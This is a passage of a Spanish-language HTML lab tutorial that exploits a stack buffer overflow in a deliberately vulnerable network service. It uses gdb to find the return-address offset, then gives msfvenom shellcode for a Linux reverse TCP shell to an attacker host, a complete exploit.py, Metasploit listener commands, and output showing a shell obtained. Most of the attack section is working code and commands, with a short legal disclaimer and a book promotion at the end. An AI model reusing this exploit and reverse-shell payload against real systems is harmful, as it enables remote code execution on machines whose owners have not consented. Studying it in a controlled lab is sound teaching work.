+   0x000055555555535e <+13>:    mov    %esi,-0x2c(%rbp)
+   0x0000555555555361 <+16>:    mov    %edx,-0x30(%rbp)
+   0x0000555555555364 <+19>:    mov    %rsp,%rax
+   0x0000555555555367 <+22>:    mov    %rax,%rbx
+...
+   0x00005555555553f9 <+168>:   mov    -0x20(%rbp),%rax
+   0x00005555555553fd <+172>:   mov    %rcx,%rsi
+   0x0000555555555400 <+175>:   mov    %rax,%rdi
+   0x0000555555555403 <+178>:   call   0x555555555100 &lt;memcpy@plt&gt;
+   0x0000555555555408 <+183>:   mov    %rbx,%rsp
+   0x000055555555540b <+186>:   nop
+...
+
+	    </code></pre>
+
+
+	    <p> 
+A partir del análisis del código fuente, identificamos que la función memcpy(buffer, Mensaje_Cliente, bytes); introduce una vulnerabilidad de desbordamiento de búfer cuando el valor del parámetro bytes supera el tamaño del búfer asignado.
+Por ello, resulta conveniente examinar el estado de la pila inmediatamente después de que el búfer es llenado, estableciendo un breakpoint (break) en el punto de interés y continuando posteriormente con la ejecución del programa bajo el depurador.
+</p>           
+
+            <pre><code class="language-bash">
+(gdb) break *copiar_Cadena_En_Buffer + 183
+Breakpoint 2 at 0x555555555408
+(gdb) set follow-fork-mode child ← Depuración el proceso hijo
+
+(gdb) c
+Continuing.
+Escuchando peticiones por el puerto: 9999
+Esperando conexiones...
+	    </code></pre>
+
+
+            <p>
+Nuevamente desde Kali, enviamos 98 caracteres:
+	   </p>
+            <pre><code class="language-bash">
+┌──(debian㉿debian)-[~/Exploit_LAB1]
+└─$ python3 -c "print('A'*94 + 'B'*4)" | nc 192.168.1.11 9999
+Ingresa una palabra para revisar si es un palíndromo:
+	    </code></pre>
+
+
+            <p>
+En la máquina objetivo se observa que la ejecución del programa se ha detenido exactamente en el Breakpoint 2 establecido, como se muestra a continuación:
+</p>	    
+            <pre><code class="language-bash">
+[Attaching after Thread 0x7ffff7dc4740 (LWP 1077) fork to child process 1080]
+[New inferior 2 (process 1080)]
+[Detaching after fork from parent process 1077]
+[Inferior 1 (process 1077) detached]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Cliente: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Dirección de inicio del buffer es                       0x7fffffffcab0
+Valor de RBP:                                           0x7fffffffcd40
+[Switching to Thread 0x7ffff7dc4740 (LWP 1080)]
+
+Thread 2.1 "Servicio_1.exe" hit Breakpoint 2, 0x0000555555555408 in copiar_Cadena_En_Buffer ()
+	    </code></pre>
+
+
+	            <!-- ARQUITECTURA DE MEMORIA Y ZOOM A LA PILA -->
+        <div id="arquitectura-memoria" class="section-card">
+            <h2 class="section-title">
+                <i class="fas fa-memory"></i>
+                Arquitectura de memoria en x86-64
+            </h2>
+            <p>Para comprender en profundidad la vulnerabilidad explotada, es necesario entender cómo el sistema operativo organiza la memoria RAM durante la ejecución de un proceso. En arquitecturas de 64 bits (x86-64), Linux asigna un espacio de memoria virtual privado para cada proceso, estructurado en los siguientes segmentos:</p>
+            
+
+	                <table class="data-table">
+                <thead>
+                    <tr><th>Segmento</th><th>Función</th><th>Direcciones típicas</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><strong>.text</strong></td><td>Código máquina del programa (instrucciones)</td><td>Bajas (0x400000)</td></tr>
+                    <tr><td><strong>.data</strong></td><td>Variables globales inicializadas</td><td>Sigue a .text</td></tr>
+                    <tr><td><strong>.bss</strong></td><td>Variables globales no inicializadas</td><td>Sigue a .data</td></tr>
+                    <tr><td><strong>Heap</strong></td><td>Memoria dinámica (malloc, new)</td><td>Crece hacia arriba (↗)</td></tr>
+                    <tr><td><strong>Stack (Pila)</strong></td><td>Variables locales, llamadas a funciones</td><td>Crece hacia abajo (↙) desde altas direcciones</td></tr>
+                </tbody>
+            </table>
+
+
+            <h3 class="section-title" style="font-size:1.3rem; margin-top:1.5rem;">
+                <i class="fas fa-draw-polygon"></i>
+                Bosquejo de la memoria de un proceso en x86-64
+            </h3>
+	    <p>A continuación se muestra una representación gráfica de cómo se disponen los diferentes segmentos en la memoria virtual de un proceso Linux de 64 bits.</p> <br>
+
+            <div style="background: #0a0c0f; border-radius: 12px; border: 1px solid #2ecc71; padding: 1rem; overflow-x: auto; font-family: 'Source Code Pro', monospace; font-size: 0.75rem;">
+                <pre style="margin: 0; padding: 0; background: transparent; border: none; color: #e0e0e0; line-height: 1.5;">
+<span style="color: #2ecc71;">| Dirección         | Segmento                | Contenido                                                    | Crecimiento          |</span>
+<span style="color: #2ecc71;">|------------------|--------------------------|--------------------------------------------------------------|----------------------|</span>
+<span style="color: #2ecc71;">| 0x7fffffffffff   | STACK (Pila)             | Variables locales, llamadas a funciones,                     | ↓ crece hacia abajo  |</span>
+<span style="color: #2ecc71;">|                  |                          | Dirección RBP (registro RBP previo  )                        |                      |</span>
+<span style="color: #2ecc71;">|                  |                          | Dirección de retorno (RIP guardado)                          |                      |</span>
+<span style="color: #6c7a89;">|                  |                          | ...(más direcciones altas...)...                             |                      |</span>
+<span style="color: #f1c40f;">| 0x7ffff7...000   | Memoria compartida (mmap)| Bibliotecas compartidas (.so, mmap)                          | ─                    |</span>
+<span style="color: #3498db;">| 0x00007f...000   | HEAP                     | Memoria dinámica (malloc, calloc, new)                       | ↑ crece hacia arriba |</span>
+<span style="color: #6c7a89;">|                  |                          | ...(segmentos internos...)...                                |                      |</span>
+<span style="color: #e74c3c;">| 0x00005555...000 | .bss                     | Variables globales no inicializadas                          | ─                    |</span>
+<span style="color: #e74c3c;">| 0x00005555...000 | .data                    | Variables globales inicializadas                             | ─                    |</span>
+<span style="color: #9b59b6;">| 0x00005555...000 | .text                    | Código máquina del programa (instrucciones ensamblador)      | ─                    |</span>
+<span style="color: #9b59b6;">|                  |                          |   0x555555555351: push %rbp                                  |                      |</span>
+<span style="color: #9b59b6;">|                  |                          |   0x555555555352: mov %rsp,%rbp                              |                      |</span>
+<span style="color: #9b59b6;">|                  |                          |   0x555555555355: push %rbx                                  |                      |</span>
+<span style="color: #6c7a89;">|                  |                          |   ...                                                        |                      |</span>
+<span style="color: #6c7a89;">|------------------|--------------------------|--------------------------------------------------------------|----------------------|</span>
+                </pre>
+            </div>
+
+            <h3 class="section-title" style="font-size:1.3rem; margin-top:1.5rem;">
+                <i class="fas fa-layer-group"></i>
+                Zoom al segmento de pila (Stack)
+            </h3>
+            <p>Cuando una función es llamada, el sistema reserva un marco (<em>stack frame</em>) en la pila que contiene:</p>
+            <ol style="margin-left: 2rem; margin-bottom: 1rem;">
+                <li>Argumentos de la función (si no caben en registros).</li>
+                <li>La <strong>dirección de retorno</strong> (RIP guardado): instrucción a la que debe volver el programa al finalizar la función.</li>
+                <li>El valor anterior del registro <strong>$rbp</strong> (<em>base pointer</em>), para restaurar el contexto de la función llamadora.</li>
+                <li>Las <strong>variables locales</strong> de la función (en nuestro caso, el <code>buffer[]</code>).</li>
+            </ol>
+
+            <p>En nuestro laboratorio, justo después de ejecutar <code>memcpy</code> (breakpoint +183), el estado de la pila es el siguiente:</p>
+            
+            <pre><code class="language-bash">
+(gdb) x/86gx $rsp
+0x7fffffffcab0: 0x4141414141414141      0x4141414141414141   ← inicio del buffer en la dirección 0x7fffffffcab0
+0x7fffffffcac0: 0x4141414141414141      0x4141414141414141
+0x7fffffffcad0: 0x4141414141414141      0x4141414141414141
+0x7fffffffcae0: 0x4141414141414141      0x4141414141414141
+0x7fffffffcaf0: 0x4141414141414141      0x4141414141414141
+0x7fffffffcb00: 0x4141414141414141      0x4242414141414141
+0x7fffffffcb10: 0x0000000000004242      0x0000000000000000
+0x7fffffffcb20: 0x0000000000000000      0x00007ffff7e21290
+...
+0x7fffffffcd30: 0x00007fffffffe2d0      0x00007fffffffe3e8
+0x7fffffffcd40: 0x00007fffffffe2d0      0x00005555555557cd   ← ¡RIP guardado!
+0x7fffffffcd50: 0x00007fffffffe3e8      0x0000000100000000
+            </code></pre>
+
+
+            <p>Además, podemos obtener más información acerca del marco de pila:</p>
+            <pre><code class="language-bash">
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffcd50:
+ rip = 0x555555555408 in copiar_Cadena_En_Buffer; saved rip = 0x5555555557cd
+ called by frame at 0x7fffffffe2e0
+ Arglist at 0x7fffffffcd40, args:
+ Locals at 0x7fffffffcd40, Previous frame's sp is 0x7fffffffcd50
+ Saved registers:
+  rbx at 0x7fffffffcd38, rbp at 0x7fffffffcd40, rip at 0x7fffffffcd48
+(gdb)
+	    </code></pre>
+
+
+            <div class="alert alert-success" style="margin-top: 1rem;">
+                <i class="fas fa-crosshairs"></i>
+                <strong>Análisis detallado:</strong>
+                <ul style="margin-top: 0.5rem; margin-left: 1.5rem;">
+                    <li>Dirección de inicio del buffer: <strong><code>0x7fffffffcab0</code></strong> (donde se almacenan las 'A' y luego 'B').</li>
+                    <li>Dirección donde se guarda el <strong>$rbp anterior</strong>: <code>0x7fffffffcd40</code> (valor: <code>0x00007fffffffe2d0</code>).</li>
+                    <li>Dirección donde se guarda el <strong>$rip de retorno</strong>: <code>0x7fffffffcd48</code> (valor original: <code>0x00005555555557cd</code>, que apunta a la dirección a retornar dentro del código en <code>main</code>).</li>
+                </ul>
+                El objetivo del atacante es <strong>sobrescribir la dirección en <code>0x7fffffffcd48</code></strong> con una dirección controlada (por ejemplo, el propio buffer <code>0x7fffffffcab0</code>), de modo que cuando la función ejecute <code>ret</code>, el programa salte al shellcode inyectado.
+            </div>
+
+            <h3 class="section-title" style="font-size:1.3rem; margin-top:1.5rem;">
+                <i class="fas fa-ruler-combined"></i>
+                Cálculo del offset
+            </h3>
+            <p>La diferencia entre la dirección de <code>$rbp</code> (<code>0x7fffffffcd40</code>) y el inicio del buffer (<code>0x7fffffffcab0</code>) es:</p>
+            <div class="terminal" style="text-align: center; font-size: 1.2rem;">
+                0x7fffffffcd40 - 0x7fffffffcab0 = 0x290 = <strong>656 bytes</strong>
+            </div>
+            <p>Como el <code>$rip</code> se guarda <strong>inmediatamente después</strong> del <code>$rbp</code> (8 bytes más arriba), el offset total para alcanzar y sobrescribir la dirección de retorno es:</p>
+            <div class="terminal" style="text-align: center; font-size: 1.2rem;">
+                656 bytes + 8 bytes = <strong>664 bytes</strong>
+            </div>
+            <p>Esto significa que los primeros 664 bytes del mensaje enviado por el cliente llenarán el buffer y luego escribirán exactamente sobre el <code>$rip</code> guardado. Los siguientes 8 bytes serán la nueva dirección de retorno (en nuestro caso, el buffer donde reside el shellcode).</p>
+
+        </div>
+
+
+<div style="display: flex; align-items: center; gap: 1rem; margin: 2rem 0;">
+    <div style="flex: 1; height: 1px; background: linear-gradient(90deg, transparent, #2ecc71, transparent);"></div>
+    <i class="fas fa-code-branch" style="color: #2ecc71;"></i>
+    <div style="flex: 1; height: 1px; background: linear-gradient(90deg, transparent, #2ecc71, transparent);"></div>
+</div>
+
+            <p>
+	    Continuamos con la ejecución del programa (comando <i>c</i> dentro de gdb), pero ahora enviamos los datos desde la máquina atacante utilizando la información previamente obtenida:
+</p>	    
+            <pre><code class="language-bash">
+──(debian㉿debian)-[~/Exploit_LAB1]
+└─$ python3 -c "print('A'*664 + 'B'*8)" | nc 192.168.1.11 9999
+Ingresa una palabra para revisar si es un palíndromo:
+	    </code></pre>
+
+            <p>
+Y observamos de nuevo el contenido de la pila, obtendremos lo siguiente:
+
+</p>	    
+            <pre><code class="language-bash">
+(gdb)  x/86gx $rsp
+0x7fffffffcab0: 0x4141414141414141      0x4141414141414141
+0x7fffffffcac0: 0x4141414141414141      0x4141414141414141
+...
+0x7fffffffcd30: 0x4141414141414141      0x4141414141414141
+0x7fffffffcd40: 0x4141414141414141      0x4242424242424242
+0x7fffffffcd50: 0x00007fffffffe3e8      0x0000000100000000
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffcd50:
+ rip = 0x555555555408 in copiar_Cadena_En_Buffer; saved rip = 0x4242424242424242
+ called by frame at 0x7fffffffcd58
+ Arglist at 0x7fffffffcd40, args:
+ Locals at 0x7fffffffcd40, Previous frame's sp is 0x7fffffffcd50
+ Saved registers:
+  rbx at 0x7fffffffcd38, rbp at 0x7fffffffcd40, rip at 0x7fffffffcd48
+(gdb)
+	    </code></pre>
+
+            <p>
+Miramos que el contenido previo del registro $rip ha sido sobrescrito con la cadena 0x4242424242424242, lo que confirma que es posible tomar el control del flujo de ejecución del programa. Al continuar con la ejecución, se produce un Segmentation fault, ya que la dirección 0x4242424242424242 no corresponde a una dirección de memoria válida. Finalmente, se finaliza el proceso utilizando el comando pkill, con el objetivo de cerrar cualquier conexión que haya quedado abierta, liberar el puerto 9999 y permitir la ejecución posterior del programa sin conflictos.
+	    </p>
+            <pre><code class="language-bash">
+(gdb) c
+Continuing.
+
+Thread 3.1 "Servicio_1.exe" received signal SIGSEGV, Segmentation fault.
+0x0000555555555411 in copiar_Cadena_En_Buffer ()
+(gdb) q
+A debugging session is active.
+
+        Inferior 3 [process 1092] will be killed.
+
+Quit anyway? (y or n) y
+debian@debian:~/LAB1$ pkill -f Servicio_1.exe
+	    </code></pre>
+
+
+<div style="display: flex; align-items: center; gap: 1rem; margin: 2rem 0;">
+    <div style="flex: 1; height: 1px; background: linear-gradient(90deg, transparent, #2ecc71, transparent);"></div>
+    <i class="fas fa-code-branch" style="color: #2ecc71;"></i>
+    <div style="flex: 1; height: 1px; background: linear-gradient(90deg, transparent, #2ecc71, transparent);"></div>
+</div>
+
+            <div class="alert alert-warning">
+                <i class="fas fa-random"></i>
+                <strong>Nota:</strong>
+		Es importante notar nuevamente que, en la declaración del búfer ubicada en la línea 22 del código fuente, la variable <i>n</i> corresponde a un valor dinámico comprendido entre 405 y 599.
+Como consecuencia, al ejecutar nuevamente el programa es posible obtener un offset distinto al previamente calculado, tal como se muestra a continuación:		
+            </div>
+
+            <pre><code class="language-bash">
+debian@debian:~/LAB1$ ./Servicio_1.exe
+Escuchando peticiones por el puerto: 9999
+Esperando conexiones...
+Conexión aceptada...
+Cliente: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Dirección de inicio del buffer es                       0x7fffffffcb70
+Valor de RBP:                                           0x7fffffffcd80
+	    </code></pre>
+
+
+            <pre><code class="language-bash">
+
+┌──(debian㉿debian)-[~/Exploit_LAB1]
+└─$ python3 -c "print('A'*94 + 'B'*4)" | nc 192.168.1.11 9999
+Ingresa una palabra para revisar si es un palíndromo:
+No, la palabra no es un palíndromo
+Dirección inicio de buffer:     0x7fffffffcb70
+Dirección registro de rbp:      0x7fffffffcd80
+
+	    </code></pre>
+
+	    <p>
+	En esta ejecución se determina que el offset requerido es de 536 bytes.
+	    </p>
+
+
+        </div>
+
+        <div id="exploit" class="section-card">
+            <h2 class="section-title">
+                <i class="fas fa-bolt"></i>
+                EXPLOIT en Python
+            </h2>
+            <p>Con la información de la dirección de inicio del búfer y el offset calculado, procedemos a generar el payload para obtener una reverse shell.</p>
+            <p><strong>Generación del shellcode con msfvenom:</strong></p>
+            <div class="terminal">
+                <div><span class="terminal-prompt">┌──(debian㉿debian)-[~]</span></div>
+                <div>└─$ msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.12 LPORT=8088 -b '\x00\x0A\x0D' -f python</div>
+                <div class="terminal-output">Payload size: 175 bytes</div>
+		<p>
+		buf = b''</p>
+		<p>buf += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d"</p>
+		<p>buf += b"\x05\xef\xff\xff\xff\x48\xbb\x3d\xc7\x25\xc8\xfd"</p>
+		<p>buf += b"\x31\x44\x1e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"</p>
+		<p>buf += b"\xff\xe2\xf4\x0c\x38\x4f\xc1\xa5\xa8\xf2\x0e\x75"</p>
+		<p>buf += b"\x4e\xf3\x85\xcc\xf8\x2e\x3c\x7c\x9d\x4f\xcf\xa7"</p>
+		<p>buf += b"\x3e\x41\x56\xb8\x07\x5d\x99\x97\x3b\x05\x47\x6d"</p>
+<p>buf += b"\xad\x0c\x90\x64\x5b\x46\x41\x57\xc6\x7b\xc7\xf8"</p>
+<p>buf += b"\x79\xc1\xde\x45\xfc\x6d\x5f\xb5\x88\x46\x1e\x22"</p>
+<p>buf += b"\x5f\xe5\x60\xfc\x3d\x15\x56\xb4\x21\x4f\xd8\xa7"</p>
+<p>buf += b"\x5b\x6e\x46\x32\xc2\x7c\x80\x78\xf1\x3d\x3b\x74"</p>
+<p>buf += b"\x38\xec\xbc\xe5\x66\x2e\x3d\x65\xad\x25\xa2\xf8"</p>
+<p>buf += b"\x79\xcd\xf9\x75\xf6\xd3\xc7\xf8\x68\x1d\x41\x75"</p>
+<p>buf += b"\x42\xe5\xb1\x3a\x5b\x78\x46\x57\xc6\x7a\xc7\xf8"</p>
+<p>buf += b"\x6f\x2e\x38\x67\xc8\x20\x80\x78\xf1\x3c\xf3\xc2"</p>
+<p>buf += b"\x21\x25\xc8\xfd\x31\x44\x1e"</p>
+            </div>
+
+            <p><strong>Script de exploit completo (exploit.py):</strong></p>
+
+
+	    <p>
+Tomando en cuenta que el tamaño del offset calculado es de 536 bytes, el exploit se construye utilizando 200 bytes de instrucciones NOP, 175 bytes correspondientes al payload encargado de obtener la reverse shell, y los 161 bytes restantes se emplean como relleno para completar los 536 bytes previos a la sobrescritura del registro $rip.
+<br><br>
+Observe que la dirección a la que saltaremos será 0x00007fffffffcc24 (180 bytes posteriores al inicio del buffer), la cual contiene instrucciones NOP y se continuará con la ejecución del payload.
+	    </p>
+
+            <div class="numbered-code">
+                <pre><code class="language-python" id="exploit-codigo">#!/usr/bin/python3
+import sys
+from struct import pack
+
+nop = b""
+nop += b'\x90' * 200
+
+# Inicio de payload
+# 175 bytes
+buf = b''
+buf += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d"
+buf += b"\x05\xef\xff\xff\xff\x48\xbb\x3d\xc7\x25\xc8\xfd"
+buf += b"\x31\x44\x1e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
+buf += b"\xff\xe2\xf4\x0c\x38\x4f\xc1\xa5\xa8\xf2\x0e\x75"
+buf += b"\x4e\xf3\x85\xcc\xf8\x2e\x3c\x7c\x9d\x4f\xcf\xa7"
+buf += b"\x3e\x41\x56\xb8\x07\x5d\x99\x97\x3b\x05\x47\x6d"
+buf += b"\xad\x0c\x90\x64\x5b\x46\x41\x57\xc6\x7b\xc7\xf8"
+buf += b"\x79\xc1\xde\x45\xfc\x6d\x5f\xb5\x88\x46\x1e\x22"
+buf += b"\x5f\xe5\x60\xfc\x3d\x15\x56\xb4\x21\x4f\xd8\xa7"
+buf += b"\x5b\x6e\x46\x32\xc2\x7c\x80\x78\xf1\x3d\x3b\x74"
+buf += b"\x38\xec\xbc\xe5\x66\x2e\x3d\x65\xad\x25\xa2\xf8"
+buf += b"\x79\xcd\xf9\x75\xf6\xd3\xc7\xf8\x68\x1d\x41\x75"
+buf += b"\x42\xe5\xb1\x3a\x5b\x78\x46\x57\xc6\x7a\xc7\xf8"
+buf += b"\x6f\x2e\x38\x67\xc8\x20\x80\x78\xf1\x3c\xf3\xc2"
+buf += b"\x21\x25\xc8\xfd\x31\x44\x1e"
+
+relleno = b""
+relleno += b'\x41' * 161
+
+# Retorno en la dirección 0x0007fffffffcc24
+rip = b""
+rip += b'\x24\xcc\xff\xff\xff\x7f\x00\x00'
+
+sys.stdout.buffer.write(nop + buf + relleno + rip + b'\x0a')
+		</code></pre>
+            </div>
+
+	    <p>
+Guardamos y ejecutamos el archivo exploit.py con python3 generando el archivo entrada.txt, el cual será utilizado para enviar el exploit completo al servicio vulnerable.
+	    </p>
+
+            <div class="terminal">
+                <div><span class="terminal-prompt">
+				┌──(debian㉿debian)-[~/Exploit_LAB1]</span></div>
+                <div>└─$ python3 exploit.py > entrada.txt</div>
+            </div>
+
+	    <p>
+Ahora es necesario contar con un servicio en escucha que permita recibir la conexión entrante cuando la reverse shell sea ejecutada desde la máquina comprometida.
+Para ello, en la máquina atacante iniciamos el framework Metasploit ejecutando los siguientes comandos:
+	    </p>
+
+	    <br>
+            <p><strong>Listener en Metasploit (consola atacante):</strong></p>
+            <div class="terminal">
+            <div><span class="terminal-prompt">
+			    <div>┌──(debian㉿debian)-[~]</div>
+ <div>└─$ msfconsole</div>
+ <div>msf6 > use exploit/multi/handler</div>
+ <div>msf6 exploit(multi/handler) > set payload linux/x64/shell/reverse_tcp</div>
+ <div>msf6 exploit(multi/handler) > set LHOST 192.168.1.12</div>
+ <div>msf6 exploit(multi/handler) > set LPORT 8088</div>
+ <div>msf6 exploit(multi/handler) > run</div>
+</span></div></div>
+
+            <p><strong>Ejecución del exploit:</strong></p>
+
+<p>
+Abrimos una consola adicional en la máquina atacante con el fin de enviar el exploit al servicio vulnerable, tal como se muestra a continuación:
+</p>
+
+            <div class="terminal">
+                <div><span class="terminal-prompt">
+				<div>┌──(debian㉿debian)-[~/Exploit_LAB1]</div>
+					<div>└─$ nc 192.168.1.11 9999 < entrada.txt </div>
+		</span></div>
+                <div>Ingresa una palabra para revisar si es un palíndromo:</div>
+            </div>
+
+
+<p>
+Finalmente, en la primera consola de la máquina atacante se puede observar que la conexión ha sido establecida exitosamente, confirmando la obtención de una reverse shell desde el sistema objetivo.
+</p>
+
+
+            <div class="terminal">
+		    [*] Started reverse TCP handler on 192.168.1.12:8088<br>
+		    [*] Sending stage (38 bytes) to 192.168.1.11<br>
+		    [*] Command shell session 2 opened (192.168.1.12:8088 -> 192.168.1.11:48830)<br>
+
+                <div><span class="terminal-prompt">id</span></div>
+                <div class="terminal-output">uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)</div>
+                <div><span class="terminal-prompt">uname -a</span></div>
+                <div class="terminal-output">Linux debian 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64 GNU/Linux</div>
+            </div>
+
+            <div class="alert alert-success">
+                <i class="fas fa-check-circle"></i>
+                <strong>Exploit exitoso:</strong> Reverse shell obtenida en el sistema víctima.
+            </div>
+        </div>
+
+
+
+                <!-- RECURSOS -->
+                <div id="recursos" class="section-card">
+                    <h2 class="section-title"><i class="fas fa-chart-line"></i> Resumen de Offsets Obtenidos</h2>
+                    <table class="data-table">
+                        <thead><tr><th>Prueba</th><th>Dirección Buffer</th><th>Dirección RBP</th><th>Offset Calculado</th><th>Observación</th></tr></thead>
+                        <tbody>
+                            <tr><td>1</td><td>0x7fffffffcab0</td><td>0x7fffffffcd40</td><td>664 bytes</td><td>Primera ejecución</td></tr>
+                            <tr><td>2</td><td>0x7fffffffcb70</td><td>0x7fffffffcd80</td><td>536 bytes</td><td>Segunda ejecución (n dinámico)</td></tr>
+                        </tbody>
+                    </table>
+                    <h3>Herramientas utilizadas</h3>
+                    <div class="resource-grid">
+                        <div class="resource-card"><i class="fas fa-microchip"></i><h4>VirtualBox 7.2.8</h4><p>Debian 12.5 / Kali Linux</p></div>
+                        <div class="resource-card"><i class="fas fa-terminal"></i><h4>GDB + msfvenom</h4><p>Depuración y generación de payload</p></div>
+                        <div class="resource-card"><i class="fas fa-bug"></i><h4>-z execstack</h4><p>Pila ejecutable</p></div>
+                        <div class="resource-card"><i class="fab fa-python"></i><h4>Python3</h4><p>Exploit personalizado</p></div>
+                    </div>
+                </div>
+
+                <div class="alert alert-danger text-center">
+                    <center><i class="fas fa-gavel"></i> <strong>AVISO LEGAL:</strong> Este contenido es únicamente con fines educativos y de investigación. La explotación de vulnerabilidades sin autorización explícita es ilegal. Realice estas prácticas exclusivamente en entornos controlados y de su propiedad.</center>
+                </div>
+            </div>
+
+            <div class="sidebar">
+                <div class="book-card">
+                    <div class="book-icon"><i class="fas fa-book"></i></div>
+                    <h3>El arte de la explotación de vulnerabilidades en sistemas modernos</h3>
+                    <p style="text-align: justify;">Si después de realizar los laboratorios despertaste tu interés, encendiste tu curiosidad o sentiste el impulso de profundizar en el fascinante mundo de la explotación de vulnerabilidades, te invito a continuar tu aprendizaje con el libro: <strong style="color: #FFFFFF;">El arte de la explotación de vulnerabilidades en sistemas modernos</strong>, una puerta hacia el dominio de técnicas avanzadas y el entendimiento profundo de los ataques en entornos reales.</p>
+                    <div class="book-gif"><img src="U.gif" alt="Libro animado" style="width: 100%; max-width: 350px; display: block; margin: 0 auto; border-radius: 12px;"></div>
+                    <a href="get_digital_only.html" style="text-decoration: none; color: inherit;"><div class="book-action"><i class="fas fa-shopping-cart"></i> Adquirir el libro</div></a>
+                    <div class="book-divider"></div>
+                    <h4><i class="fas fa-shield-alt"></i> Contenido destacado:</h4>
+                    <ul><li>✓ Principios de memoria, ingeniería inversa y depuración</li><li>✓ Mecanismos modernos de protección (ASLR, DEP, canarios de pila)</li><li>✓ Técnicas de evasión: ROP chaining, shellcodes personalizados</li><li>✓ Evasión perimetral IDS/IPS y Antivirus</li><li>✓ Explotación remota y comunicación inversa</li><li>✓ Encadenamiento de funciones y elevación de privilegios</li></ul>
+                    <div class="book-divider"></div>
+                    <p class="book-conclusion" style="text-align: justify;"><strong>Conclusión:</strong> Al finalizar esta obra, no solo habrás aprendido a explotar vulnerabilidades: habrás desarrollado la mentalidad de un verdadero experto en seguridad ofensiva.</p>
+                    <a href="get_digital_only.html" style="text-decoration: none; color: inherit;"><div class="book-action"><i class="fas fa-shopping-cart"></i> Adquirir el libro</div></a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p><i class="fas fa-terminal"></i> ReverseShell | Laboratorio de Explotación de Vulnerabilidad - BOF</p>
+        <p style="margin-top: 0.5rem; font-size: 0.85rem;">
+            <a href="index.html" style="color: #2ecc71; text-decoration: none; margin: 0 0.5rem;">← Volver al Portal Principal</a> |
+            <a href="Lab_2.html" style="color: #2ecc71; text-decoration: none; margin: 0 0.5rem;">Laboratorio 2 (Privilege Escalation) →</a>
+        </p>
+        <p style="margin-top: 0.5rem; font-size: 0.85rem;">© 2026 - El arte de la explotación de vulnerabilidades en sistemas modernos | <span style="color: #2ecc71;">#EthicalHacking #BufferOverflow #ReverseShell</span></p>
+    </footer>
+
+    <script>
+        hljs.highlightAll();
+        document.querySelectorAll('pre').forEach(block => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.innerHTML = '<i class="fas fa-copy"></i> Copiar';
+            block.style.position = 'relative';
+            block.appendChild(btn);
+            btn.addEventListener('click', () => {
+                const code = block.querySelector('code');
+                const text = code ? code.innerText : block.innerText;
+                navigator.clipboard.writeText(text);
+                btn.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+                setTimeout(() => { btn.innerHTML = '<i class="fas fa-copy"></i> Copiar'; }, 2000);
+            });
+        });
+        // Soporte para móviles: toggles en submenús
+        if (window.innerWidth <= 1024) {
+            document.querySelectorAll('.nav-item').forEach(item => {
+                const link = item.querySelector('.nav-link');
+                if(link && item.querySelector('.submenu') && !link.href) {
+                    link.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        item.classList.toggle('active');
+                    });
+                }
+            });
+        }
+    </script>
+</body>
+</html>
